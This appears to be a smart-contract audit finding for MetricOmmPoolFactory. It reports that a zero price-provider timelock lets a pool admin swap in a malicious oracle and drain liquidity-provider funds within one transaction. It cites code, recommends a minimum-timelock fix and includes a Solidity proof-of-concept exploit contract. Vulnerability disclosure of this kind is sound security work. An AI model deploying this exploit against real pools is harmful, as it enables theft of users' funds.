### Title
Zero `priceProviderTimelock` Allows Pool Admin to Atomically Rotate to a Malicious Price Provider and Drain LP Funds — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory.createPool` accepts `priceProviderTimelock = 0` without any minimum-value guard. When the timelock is zero, `proposePoolPriceProvider` sets `pendingPriceProviderExecuteAfter[pool] = block.timestamp + 0 = block.timestamp`, and `executePoolPriceProviderUpdate` immediately passes its `block.timestamp < execAfter` check. A pool admin can therefore propose and execute a price-provider rotation in the same transaction, point the pool at a manipulated oracle, execute a swap that extracts LP value at an artificial price, and restore the original provider — all atomically.

---

### Finding Description

`_validatePoolParameters` enforces caps on fees, non-zero tokens, non-zero admin, and non-zero initial amounts, but contains **no lower-bound check on `priceProviderTimelock`**: [1](#0-0) 

The raw value is stored directly: [2](#0-1) 

In `proposePoolPriceProvider`, the deadline is computed as:

```solidity
uint256 executeAfter = block.timestamp + timelock;   // = block.timestamp when timelock == 0
``` [3](#0-2) 

In `executePoolPriceProviderUpdate`, the guard is:

```solidity
if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(...);
``` [4](#0-3) 

When `timelock == 0`, `execAfter == block.timestamp`, so `block.timestamp < block.timestamp` is `false` and the revert is never triggered. Both functions carry `nonReentrant` but are independent calls; a contract controlled by the pool admin can call them sequentially in one transaction.

The only validation on the incoming provider is a token-pair match: [5](#0-4) 

Any contract that returns the correct `token0()`/`token1()` and an arbitrary bid/ask passes this check.

This is the residual gap left by the M01 fix documented in `AuditFindings.md`, which introduced the timelock mechanism but did not enforce a minimum value: [6](#0-5) 

---

### Impact Explanation

A pool admin who created (or controls) a pool with `priceProviderTimelock = 0` can, in a single atomic transaction:

1. Deploy a malicious `IPriceProvider` that returns the correct token pair but a heavily skewed bid/ask (e.g., bid ≈ 0 or ask ≈ ∞).
2. Call `proposePoolPriceProvider(pool, maliciousProvider)` — sets `pendingPriceProviderExecuteAfter = block.timestamp`.
3. Call `executePoolPriceProviderUpdate(pool)` — immediately installs the malicious provider.
4. Call `pool.swap(...)` — the pool reads the manipulated bid/ask and executes at an artificial price, transferring LP-owned tokens to the attacker at far below (or above) fair value.
5. Restore the original provider via another propose+execute pair.

The swap math uses the live oracle quote for every execution step: [7](#0-6) 

LPs have no recourse; the entire LP balance in the affected bins can be extracted in one block. This is a **direct loss of LP principal**, matching the Critical/High threshold.

---

### Likelihood Explanation

- `priceProviderTimelock = 0` is a valid, accepted parameter — the factory deploys the pool without error.
- The documentation only offers a guideline ("pick a finite delay"), not an enforcement.
- The pool admin is the only required actor; no external price movement or mempool timing is needed.
- The attack is atomic (single transaction), so it cannot be front-run or blocked by monitoring.
- Likelihood is **Medium**: requires a pool to exist with `priceProviderTimelock = 0` and a pool admin willing to exploit it, but the factory provides no protection against this configuration.

---

### Recommendation

Enforce a minimum timelock in `_validatePoolParameters`:

```solidity
uint256 internal constant MIN_PRICE_PROVIDER_TIMELOCK = 1 days;

// inside _validatePoolParameters:
if (params.priceProviderTimelock != type(uint256).max &&
    params.priceProviderTimelock < MIN_PRICE_PROVIDER_TIMELOCK) {
    revert PriceProviderTimelockTooShort();
}
```

This mirrors the intent of the M01 fix and closes the residual bypass. The minimum value should be chosen to give LPs sufficient time to exit before a provider rotation takes effect.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

contract MaliciousProvider {
    address public immutable token0;
    address public immutable token1;
    uint128 public bid;
    uint128 public ask;

    constructor(address t0, address t1, uint128 _bid, uint128 _ask) {
        token0 = t0; token1 = t1; bid = _bid; ask = _ask;
    }
    function getBidAndAskPrice() external returns (uint128, uint128) {
        return (bid, ask);
    }
}

contract AdminExploit {
    IMetricOmmPoolFactory factory;
    address pool;
    address originalProvider;

    function attack(address _factory, address _pool, address _originalProvider) external {
        factory = IMetricOmmPoolFactory(_factory);
        pool = _pool;
        originalProvider = _originalProvider;

        // 1. Deploy malicious provider with skewed price (bid ≈ 0)
        (address t0, address t1) = (IMetricOmmPool(pool).TOKEN0(), IMetricOmmPool(pool).TOKEN1());
        MaliciousProvider bad = new MaliciousProvider(t0, t1, 1, type(uint128).max / 2);

        // 2. Propose + execute in same tx (timelock == 0 → execAfter == block.timestamp)
        factory.proposePoolPriceProvider(pool, address(bad));
        factory.executePoolPriceProviderUpdate(pool);

        // 3. Swap at manipulated price — extract LP value
        IMetricOmmPool(pool).swap(address(this), true, 1_000_000, 0, "", "");

        // 4. Restore original provider
        factory.proposePoolPriceProvider(pool, originalProvider);
        factory.executePoolPriceProviderUpdate(pool);
    }
}
```

The attack succeeds because `priceProviderTimelock[pool] == 0` makes steps 2 and 4 execute without any block delay, and `_validatePriceProvider` only checks token addresses, not provider behavior. [8](#0-7)

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L213-213)
```text
    priceProviderTimelock[pool] = params.priceProviderTimelock;
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L474-507)
```text
  function proposePoolPriceProvider(address pool, address newPriceProvider)
    external
    override
    nonReentrant
    onlyPoolAdmin(pool)
  {
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    uint256 timelock = priceProviderTimelock[pool];
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, newPriceProvider);

    address mutableProvider = PoolStateLibrary._slot3(pool);
    address current = mutableProvider != address(0) ? mutableProvider : p.immutablePriceProvider;
    uint256 executeAfter = block.timestamp + timelock;
    pendingPriceProvider[pool] = newPriceProvider;
    pendingPriceProviderExecuteAfter[pool] = executeAfter;
    emit PoolPriceProviderChangeProposed(pool, current, newPriceProvider, executeAfter);
  }

  /// @inheritdoc IMetricOmmPoolFactoryPoolAdmin
  function executePoolPriceProviderUpdate(address pool) external override nonReentrant onlyPoolAdmin(pool) {
    address pending = pendingPriceProvider[pool];
    if (pending == address(0)) revert NoPriceProviderChangeProposed();
    uint256 execAfter = pendingPriceProviderExecuteAfter[pool];
    // forge-lint: disable-next-line(block-timestamp) -- timelock enforcement legitimately relies on `block.timestamp`.
    if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(execAfter, block.timestamp);
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, pending);
    IMetricOmmPoolFactoryActions(pool).setPriceProvider(pending);
    delete pendingPriceProvider[pool];
    delete pendingPriceProviderExecuteAfter[pool];
    emit PoolPriceProviderUpdated(pool, pending);
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-545)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L548-563)
```text
  function _validatePoolParameters(PoolParameters calldata params) internal view {
    if (params.token0 == address(0) || params.token1 == address(0) || params.token0 == params.token1) {
      revert InvalidTokenConfig();
    }
    if (params.admin == address(0)) revert InvalidAdmin();
    _validatePriceProvider(params.token0, params.token1, params.priceProvider);
    if (params.adminFeeDestination == address(0)) revert InvalidAdminFeeDestination();
    if (spreadProtocolFeeE6 > maxProtocolSpreadFeeE6) revert ProtocolFeeTooHigh();
    if (protocolNotionalFeeE8 > maxProtocolNotionalFeeE8) revert ProtocolFeeTooHigh();
    if (params.adminSpreadFeeE6 > maxAdminSpreadFeeE6) revert AdminFeeTooHigh();
    if (params.adminNotionalFeeE8 > maxAdminNotionalFeeE8) revert AdminFeeTooHigh();
    if (params.initialAmount0PerShareE18 == 0 || params.initialAmount1PerShareE18 == 0) {
      revert InvalidInitialAmount();
    }
    if (params.minimalMintableLiquidity == 0) revert InvalidMinimalMintableLiquidity();
  }
```

**File:** metric-core/docs/AuditFindings.md (L45-69)
```markdown
## M01 - Admin can arbitrarily change the pool priceProvider

### Finding summary

`setPriceProvider()` allowed admin to replace oracle at runtime, and `priceProvider` was returned by `getImmutables()`.

### Resolution

Fixed.

Changes:

- Added constructor config `priceProviderTimelock`.
- Added admin flow:
  - `proposePriceProvider(address newPriceProvider)`
  - `executePriceProviderUpdate()`
- Added events:
  - `PriceProviderChangeProposed(currentPriceProvider, newPriceProvider, executeAfter)`
  - `PriceProviderUpdated(newPriceProvider)`

Behavior now:

- `priceProviderTimelock == type(uint256).max` => immutable mode (admin updates disabled).
- `priceProviderTimelock < type(uint256).max` => mutable mode with delayed execution.
- Price provider used by swaps/reports resolves through timelock mode; active provider is read via `MetricOmmPoolStateView.priceProvider(pool)`.
```

**File:** metric-core/contracts/MetricOmmPool.sol (L481-490)
```text

  // ============ External: view ============

  /// @inheritdoc IMetricOmmPool
  function inSwap() external view returns (address priceProvider_) {
    if (_currentAction() == PoolActions.SWAP) {
      return _resolvedPriceProvider();
    }
    return address(0);
  }
```
